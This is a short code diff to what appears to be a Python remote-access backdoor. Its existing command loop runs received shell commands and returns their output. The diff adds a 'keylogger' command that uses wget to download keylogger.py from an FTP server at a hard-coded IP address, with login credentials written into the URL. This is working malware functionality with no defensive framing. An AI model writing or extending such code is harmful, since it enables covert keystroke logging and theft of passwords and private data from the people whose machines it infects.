@@ -57,6 +57,13 @@ def main():
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                       stdin=subprocess.PIPE)
             results = results.stdout.read() + results.stderr.read()
+            
+        elif cmd == 'keylogger':
+            action = 'wget ftp://siic:azerty@84.39.49.25/keylogger/keylogger.py'
+            results = subprocess.Popen(action, shell=True,
+                      stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                      stdin=subprocess.PIPE)
+            results = results.stdout.read() + results.stderr.read()
 
         elif cmd == 'kill':
             conn.close()
